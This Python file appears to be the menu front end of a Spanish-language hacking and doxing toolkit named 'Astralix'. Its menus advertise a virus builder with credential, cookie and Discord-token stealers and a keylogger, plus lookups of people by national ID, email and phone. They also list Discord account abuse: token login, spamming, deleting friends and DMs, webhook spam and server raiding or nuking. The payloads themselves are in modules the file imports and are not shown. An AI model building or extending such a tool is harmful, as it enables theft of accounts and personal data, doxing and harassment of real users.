import shutil, os
from colorama                                        import init, Fore, Style
from src.utils.console                               import clear
from src.commands.dox.comandos.token.token_login     import token_login
from src.commands.dox.comandos.email_track           import email_track
from src.commands.dox.comandos.bot.invite_bot        import invite_bot_id
from src.utils.console                               import centrar_texto

init(autoreset=True)


R = Fore.RED
W = Fore.WHITE
GRAY = Fore.LIGHTBLACK_EX
G = Fore.GREEN
P = Fore.MAGENTA

def doxing():
    doxing_letra = f"""
{Fore.RED}  ██████ ▄▄▄█████▓▓█████  ██▓    ▄▄▄       ██▀███ ▓██   ██▓  ██████ 
{Fore.RED}▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒   ▒████▄    ▓██ ▒ ██▒▒██  ██▒▒██    ▒ 
{Fore.RED}░ ▓██▄   ▒ ▓██░ ▒░▒███   ▒██░   ▒██  ▀█▄  ▓██ ░▄█ ▒ ▒██ ██░░ ▓██▄   
{Fore.RED} ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██░   ░██▄▄▄▄██ ▒██▀▀█▄   ░ ▐██▓░  ▒   ██▒
{Fore.RED}▒██████▒▒  ▒██▒ ░ ░▒████▒░██████▒▓█   ▓██▒░██▓ ▒██▒ ░ ██▒▓░▒██████▒▒
{Fore.RED}▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░░ ▒▓ ░▒▓░  ██▒▒▒ ▒ ▒▓▒ ▒ ░
{Fore.LIGHTRED_EX}░ ░▒  ░ ░    ░     ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░  ░▒ ░ ▒░▓██ ░▒░ ░ ░▒  ░ ░
{Fore.LIGHTRED_EX}░  ░  ░    ░         ░     ░ ░    ░   ▒     ░░   ░ ▒ ▒ ░░  ░  ░  ░  
{Fore.LIGHTRED_EX}     ░              ░  ░    ░  ░     ░  ░   ░     ░ ░           ░  
"""
    centrar_texto(doxing_letra)

def opciones():
    opciones = f"""
{Fore.RED}┌─ [{W}G{R}] 
{Fore.RED}├─ [{W}N{R}]                                                                                            
{Fore.RED}├─ [{W}B{R}]      ┌─────────────────┐                        ┌───────┐                           ┌───────────┐          
{Fore.RED}└─┬─────────┤ {Fore.LIGHTRED_EX}Virus Builder   {Fore.RED}├─────────┬──────────────┤ {Fore.LIGHTRED_EX}Osint {Fore.RED}├──────────────┬────────────┤ {Fore.LIGHTRED_EX}Utilidade {Fore.RED}├──────────────
{Fore.RED}  │         └─────────────────┘         │              └───────┘              │            └───────────┘
{Fore.RED}  └─ [{W}1{R}] {W}Crear virus                    {R}├─ [{W}2{R}] {W}Buscar DNI                     {R}└─ [{W}6{R}] {W}Login Roblox Cokies
{Fore.RED}          ├─ {W}Stealer                    {R}├─ [{W}3{R}] {W}Buscar redes                   
{Fore.RED}          │  ├─ {W}Gestores/wifi           {R}├─ [{W}4{R}] {W}Email track        
{Fore.RED}          │  ├─ {W}Discord Token           {R}└─ [{W}5{R}] {W}Look Phone                   
{Fore.RED}          │  ├─ {W}Navegador stelar
{Fore.RED}          │  └─ {W}Cookie
{Fore.RED}          │  
{Fore.RED}          └─ {W}Malware
{Fore.RED}             ├─  {W}Keylogger
{Fore.RED}             └─  {W}Monitoreo
"""
    print(opciones)

def opciones2():    
    opciones2 = f"""

{Fore.RED} ┌─ [{W}B{R}]                                                ┌─────────┐                                               
{Fore.RED} └─┬───────────────────────────────────────────────────┤ {Fore.LIGHTRED_EX}Discord {Fore.RED}├────────────────────────────────────────────────────
{Fore.RED}   │                                                   └─────────┘                       
{Fore.RED}   ├─ [{W}7{R}] {W}Token-info{R}                                      ┌─ [{W}15{R}] {W}Generar-invite-bot{R}           ┌─ [{W}19{R}] {W}Bot-raid-server
{Fore.RED}   ├─ [{W}8{R}] {W}Token-Join{R}                                      ├─ [{W}16{R}] {W}Webhook-info{R}                 ├─  {W}Bot/raid
{Fore.RED}   ├─ [{W}9{R}] {W}Token-leave{R}                                     ├─ [{W}17{R}] {W}Webhook-delete{R}               │   ├─ {W}Mas-Dms
{Fore.RED}   ├─ [{W}10{R}] {W}Token-login{R}                                    ├─ [{W}18{R}] {W}Webhook-spam{R}                 │   ├─ {W}nuke/server
{Fore.RED}   ├─ [{W}11{R}] {W}token-Spamer{R}                                   ├─ [{W}18{R}] {W}discord-cloner{R}               │   └─ {W} Spam/canal
{Fore.RED}   ├─ [{W}12{R}] {W}Token-eliminar-friends{R}                         │                                    │  
{Fore.RED}   ├─ [{W}13{R}] {W}Token-Bloquear-friends{R}                         │                                    │
{Fore.RED}   ├─ [{W}14{R}] {W}Token-eliminar-dms{R}                             │                                    │
{Fore.RED}   ├─ [{W}14{R}] {W}Token-Info{R}                                     │                                    │
{Fore.RED}   └──────────────────────────────────────────────────────┴────────────────────────────────────┘
"""
    clear()
    doxing()
    print(opciones2)




def menu_simplify():
    while True:
        opcion = input(Fore.RED +
        "┌───[Menu-2@discord.gg/astralix]─\n"
        "└──$ " + Style.RESET_ALL)
        
        try:
            if opcion in ['dni', '2']:
                break

            elif opcion in ['token login', '10']:   
                token_login()  

            elif opcion in ['email track', '4']:   
                email_track()


            elif opcion in ['invite bot', '15']:    
                invite_bot_id()      

            elif opcion == 'n':    
                opciones2()

            elif opcion == 'b':    
                clear()
                doxing()
                opciones()
                
            elif opcion == 'clear':
                clear()  
                doxing()

            elif opcion == 'help':
                clear()
                doxing()
                opciones()

            elif opcion == 'close':
                clear()
                break

            elif opcion == 'exit':
                clear()
                break    

            else:
                input(f"""{R}[{W}x{R}] {R}| {R}Opcion invalida revise {G}/help""")
                clear()
                doxing()
                opciones()
        except Exception as e:
            print(f"Consultar a pablo")
                


if __name__ == "__main__":
    clear()
    doxing()
    opciones()